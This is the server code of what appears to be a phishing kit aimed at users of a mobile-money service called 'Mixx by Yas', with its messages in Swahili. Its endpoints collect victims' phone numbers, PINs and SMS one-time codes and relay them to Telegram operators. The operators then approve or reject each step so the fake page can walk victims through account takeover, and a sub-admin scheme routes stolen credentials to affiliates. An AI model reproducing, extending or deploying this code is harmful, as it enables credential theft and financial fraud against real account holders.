const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '').trim();

const PORT = process.env.PORT || 10000;
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

let activeSessions = {};
let authorizedAdmins = new Set([MAIN_ADMIN_ID]);
let pendingAdmins = {};

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

bot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    if (msg.text.startsWith('/start')) {
        if (userIdStr === MAIN_ADMIN_ID) {
            authorizedAdmins.add(userIdStr);
            sendAdminLink(chatId, userIdStr, firstName, username);
            return;
        }

        if (authorizedAdmins.has(userIdStr)) {
            sendAdminLink(chatId, userIdStr, firstName, username);
            return;
        }

        pendingAdmins[userIdStr] = { chatId, firstName, username };
        
        const requestText = `🚨 *Maombi Mapya ya Sub-Admin!*\n\n` +
            `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
            `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
            `🏷 *Username:* ${escapeMarkdown(username)}`;

        bot.sendMessage(MAIN_ADMIN_ID, requestText, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "RUHUSU (APPROVE)", callback_data: `approveadmin_${userIdStr}` },
                        { text: "KATAA (DENY)", callback_data: `denyadmin_${userIdStr}` }
                    ]
                ]
            }
        }).catch(err => console.error("Error sending auth request to main admin:", err));

        bot.sendMessage(chatId, "⏳ Ombi lako limeshatumwa kwa Msimamizi Mkuu (Main Admin). Subiri uidhinishwe.");
    }
});

function sendAdminLink(chatId, userIdStr, firstName, username) {
    const host = process.env.RENDER_EXTERNAL_URL || 'https://mixx-by-yas-m5oy.onrender.com';
    const isolatedLink = `${host}/?admin=${userIdStr}`;
    const welcomeText = `🚨 *Kiungo Chako cha Admin Kimesajiliwa!*\n\n` +
        `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
        `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
        `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
        `🔗 *Kiungo Chako Maalum:*\n${isolatedLink}`;

    bot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
        .catch(err => console.error("Error sending start message:", err));
}

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const userIdStr = chatId.toString().trim();

    if (data.startsWith('approveadmin_') || data.startsWith('denyadmin_')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            bot.answerCallbackQuery(query.id, { text: "⚠ Wewe si Main Admin!", show_alert: true });
            return;
        }
        const targetSubId = data.split('_')[1];
        const subAdminInfo = pendingAdmins[targetSubId];

        if (data.startsWith('approveadmin_')) {
            authorizedAdmins.add(targetSubId);
            if (subAdminInfo) {
                sendAdminLink(subAdminInfo.chatId, targetSubId, subAdminInfo.firstName, subAdminInfo.username);
                bot.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu Sub-Admin ${targetSubId} kwa mafanikio.`);
            }
        } else {
            if (subAdminInfo) {
                bot.sendMessage(subAdminInfo.chatId, "❌ Ombi lako la kuwa Sub-Admin limekataliwa.");
                bot.sendMessage(MAIN_ADMIN_ID, `❌ Umekataa ombi la Sub-Admin ${targetSubId}.`);
            }
        }
        delete pendingAdmins[targetSubId];
        bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: query.message.message_id }).catch(() => {});
        bot.answerCallbackQuery(query.id);
        return;
    }

    if (!authorizedAdmins.has(userIdStr)) {
        bot.answerCallbackQuery(query.id, { text: "⚠ Hautakiwi kufanya hivi!", show_alert: true });
        return;
    }

    const parts = data.split('_');
    const action = parts[0]; 
    const sessionId = parts.slice(1).join('_');

    const session = activeSessions[sessionId];
    if (!session) {
        bot.answerCallbackQuery(query.id, { text: "Kipindi kimeisha au hakionekani.", show_alert: true });
        return;
    }

    if (action === 'allow') session.status = 'approved_pin';
    else if (action === 'deny') session.status = 'denied';
    else if (action === 'wrongpin') session.status = 'wrong_pin';
    else if (action === 'wrongsms') session.status = 'wrong_sms';
    else if (action === 'approved') session.status = 'success';

    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: chatId,
        message_id: query.message.message_id
    }).catch(err => console.error("Error clearing markup:", err));

    bot.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
});

app.post('/api/submit-credentials', (req, res) => {
    const { sessionId, phone, pin, adminId } = req.body;
    
    // Sub-admin receives message for their own link. Fallback to Main Admin if none.
    const targetAdmin = (adminId && authorizedAdmins.has(adminId)) ? adminId : MAIN_ADMIN_ID;

    activeSessions[sessionId] = {
        phone, pin,
        targetAdmin,
        status: 'pending_pin_approval'
    };

    const message = `OMBI JIPYA LA MIXX\n\n` +
        `NAMBARI YA SIMU: ${phone}\n` +
        `PIN: ${pin}`;

    bot.sendMessage(targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
                    { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
                ]
            ]
        }
    }).catch(err => {
        console.error(`Telegram Error:`, err.response ? err.response.body : err.message);
    });

    res.json({ success: true, sessionId });
});

app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, message: 'Session not found' });
    }

    session.otpText = otpText;
    session.status = 'pending_final_approval';

    const message = `UTHIBITISHO WA SMS OTP\n\n` +
        `NAMBARI YA SIMU: ${session.phone}\n\n` +
        `OTP:\n${otpText}`;

    bot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
                ],
                [
                    { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
                    { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
                ],
                [
                    { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
                ]
            ]
        }
    }).catch(err => console.error(`Failed to send OTP alert to admin:`, err));

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ status: session.status });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
        
